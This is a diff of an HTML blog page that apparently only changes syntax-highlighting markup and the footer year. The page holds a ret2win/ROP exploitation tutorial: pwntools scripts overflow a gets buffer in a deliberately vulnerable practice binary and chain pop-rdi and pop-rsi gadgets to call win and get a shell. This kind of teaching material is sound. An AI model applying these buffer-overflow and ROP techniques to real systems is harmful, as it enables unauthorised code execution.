@@ -156,7 +156,7 @@
 
 <h1 id="analysis">Analysis</h1>
 <p>Lets take a look at the code again.</p>
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include&lt;stdio.h&gt;
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
 </span>
 <span class="c1">// Compiled with: gcc ret2shellcode.c -o ret2shellcode -z execstack -no-pie -fno-stack-protector </span>
 
@@ -229,66 +229,66 @@ This is what we get for given binay.</p>
 
 <p>Lets start writing the exploit script.</p>
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
-</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
 	<span class="k">global</span> <span class="n">p</span>
 	<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
-		<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'localhost'</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
+		<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">localhost</span><span class="sh">'</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
 	<span class="k">else</span><span class="p">:</span>
-		<span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">()</span>
+		<span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="nf">process</span><span class="p">()</span>
 
-<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./ret2shellcode'</span><span class="p">)</span>
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./ret2shellcode</span><span class="sh">'</span><span class="p">)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
-<span class="n">start</span><span class="p">()</span>
+<span class="nf">start</span><span class="p">()</span>
 
 <span class="c1">### Exploit Goes here ###
 </span><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x68</span>
 <span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x40129b</span>
 <span class="n">pop_rsi_pop_r15_ret</span> <span class="o">=</span> <span class="mh">0x401299</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
-<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
 </code></pre></div></div>
 <p>We need a payload which sets the register to desired value and calls <em>win</em> afterwards.<br />
 First we need to fill the payload with junk bytes to get upto RIP.</p>
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Offset upto RIP
-</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="n">offset</span>
+</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="n">offset</span>
 </code></pre></div></div>
 <p>To set RDI to 0xdeadbeef we will use <code class="language-plaintext highlighter-rouge">pop_rdi_ret</code> gadget. <code class="language-plaintext highlighter-rouge">p64</code> is a function in pwntools which returns byte representation of given integer for 64 bit architecture in little-endian format. For 32 bit, you have to use <code class="language-plaintext highlighter-rouge">p32</code>.</p>
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># set RDI=0xdeadbeef
-</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
 </code></pre></div></div>
 <p>To set RSI to 0xcafebabe we will use <code class="language-plaintext highlighter-rouge">pop_rsi_pop_r15_ret</code> gadget. As I said earlier, we don’t care what R15 holds, we will use a junk value (NULL).</p>
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># set RSI=0xcafebabe R15=0
-</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_pop_r15_ret</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xcafebabe</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_pop_r15_ret</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xcafebabe</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
 </code></pre></div></div>
 <p>Now that we have set the registers properly, we need to call <em>win</em> to get shell. I used pwntools’ <code class="language-plaintext highlighter-rouge">ELF</code> class to get <em>win</em>’s address.</p>
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># call win
-</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">win</span><span class="p">)</span>
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">win</span><span class="p">)</span>
 </code></pre></div></div>
 <p>Now we need to send the payload to see the action. (sendline because gets requires a newline)</p>
-<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 </code></pre></div></div>
 <p>and BOOM! you have got shell again.</p>
 
 <h2 id="final-exploit">Final exploit</h2>
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
-</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
 	<span class="k">global</span> <span class="n">p</span>
 	<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
-		<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'localhost'</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
+		<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">localhost</span><span class="sh">'</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
 	<span class="k">else</span><span class="p">:</span>
-		<span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">()</span>
+		<span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="nf">process</span><span class="p">()</span>
 
-<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./ret2shellcode'</span><span class="p">)</span>
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./ret2shellcode</span><span class="sh">'</span><span class="p">)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
-<span class="n">start</span><span class="p">()</span>
+<span class="nf">start</span><span class="p">()</span>
 
 <span class="c1">### Exploit Goes here ###
 </span><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x68</span>
@@ -296,39 +296,39 @@ First we need to fill the payload with junk bytes to get upto RIP.</p>
 <span class="n">pop_rsi_pop_r15_ret</span> <span class="o">=</span> <span class="mh">0x401299</span>
 
 <span class="c1"># Offset upto RIP
-</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="n">offset</span>
+</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="n">offset</span>
 
 <span class="c1"># set RDI=0xdeadbeef
-</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
 
 <span class="c1"># set RSI=0xcafebabe R15=0
-</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_pop_r15_ret</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xcafebabe</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_pop_r15_ret</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xcafebabe</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
 
 <span class="c1"># call win
-</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">win</span><span class="p">)</span>
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">win</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
-<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
 </code></pre></div></div>
 <p>There is a better way to represent the rop chain to make it more understandable.</p>
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
-</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
 	<span class="k">global</span> <span class="n">p</span>
 	<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
-		<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'localhost'</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
+		<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">localhost</span><span class="sh">'</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
 	<span class="k">else</span><span class="p">:</span>
-		<span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">()</span>
+		<span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="nf">process</span><span class="p">()</span>
 
-<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./ret2shellcode'</span><span class="p">)</span>
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./ret2shellcode</span><span class="sh">'</span><span class="p">)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
-<span class="n">start</span><span class="p">()</span>
+<span class="nf">start</span><span class="p">()</span>
 
 <span class="c1">### Exploit Goes here ###
 </span><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x68</span>
@@ -347,44 +347,44 @@ First we need to fill the payload with junk bytes to get upto RIP.</p>
 <span class="p">]</span>
 
 <span class="c1"># Offset upto RIP
-</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="n">offset</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="n">p64</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">rop_chain</span><span class="p">])</span>
+</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="n">offset</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="nf">p64</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">rop_chain</span><span class="p">])</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
-<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
 </code></pre></div></div>
 <p>Now for the final sauce, you can use pwntools’ ROP utility to automate all dirty stuff (finding gadgets, arranging them correctly, taking care of architecture etc.)</p>
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
-</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
 	<span class="k">global</span> <span class="n">p</span>
 	<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
-		<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'localhost'</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
+		<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">localhost</span><span class="sh">'</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
 	<span class="k">else</span><span class="p">:</span>
-		<span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">()</span>
+		<span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="nf">process</span><span class="p">()</span>
 
-<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./ret2shellcode'</span><span class="p">)</span>
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./ret2shellcode</span><span class="sh">'</span><span class="p">)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
-<span class="n">start</span><span class="p">()</span>
+<span class="nf">start</span><span class="p">()</span>
 
 <span class="c1">### Exploit Goes here ###
 </span><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x68</span>
 
 <span class="c1"># Initializing ROP with the elf to find gadgets
-</span><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
-<span class="n">rop</span><span class="p">.</span><span class="n">win</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">,</span> <span class="mh">0xcafebabe</span><span class="p">)</span>
+</span><span class="n">rop</span> <span class="o">=</span> <span class="nc">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
+<span class="n">rop</span><span class="p">.</span><span class="nf">win</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">,</span> <span class="mh">0xcafebabe</span><span class="p">)</span>
 
 <span class="c1"># Offset upto RIP
-</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="n">offset</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">rop</span><span class="p">.</span><span class="n">chain</span><span class="p">()</span>
+</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="n">offset</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">rop</span><span class="p">.</span><span class="nf">chain</span><span class="p">()</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
-<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
 </code></pre></div></div>
 
 <p>If any of you have any questions, suggestions or doubts, please reach out to me on discord (stdnoerr#7880) or twitter (@stdnoerr)</p>
@@ -494,7 +494,7 @@ First we need to fill the payload with junk bytes to get upto RIP.</p>
 		<footer>
 			<hr/>
 			<p>
-				&copy; 2022 stdnoerr with <a href="http://jekyllrb.com/">Jekyll</a>. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
+				&copy; 2024 stdnoerr with <a href="http://jekyllrb.com/">Jekyll</a>. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
 			</p>
 		</footer>
 	</div>
